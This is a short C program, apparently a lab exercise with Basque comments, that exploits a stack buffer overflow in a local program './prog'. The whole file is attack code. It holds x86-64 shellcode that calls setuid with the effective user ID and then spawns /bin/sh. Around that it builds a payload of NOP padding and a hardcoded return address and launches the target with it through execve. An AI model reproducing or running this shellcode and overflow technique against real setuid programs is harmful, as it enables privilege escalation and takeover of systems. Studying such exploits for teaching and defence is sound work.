#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = 
		"\x48\x31\xC0\xB0\x6B\x0F\x05\x48\x89\xC7\xB0\x69\x0F\x05\x48\x31"
                "\xC0\x48\x31\xD2\x52\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x53"
                "\x48\x89\xE7\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x90\x90\x90\x90";	

unsigned char helb[] =
	"\x80\xec\xff\xff\xff\x7f\x00\x00";

int main() {
	char payload[80];

	char *programa = "./prog";

	int offset = 24;

	memcpy(payload, shellcode, sizeof(shellcode)-1); // shellcodea sartu pilan tartean, bat kendu bukaerako null ez kopiatzeko

	memset(payload + (sizeof(shellcode)-1), 0x90, offset); // Nopetaz bete pilaren lehen zatia

	memcpy(payload + (sizeof(shellcode) - 1) + offset, helb, 8);

	char *argv[] = {programa, payload, NULL};

	execve(programa, argv, NULL);

	perror("execve");
	return 1;
}
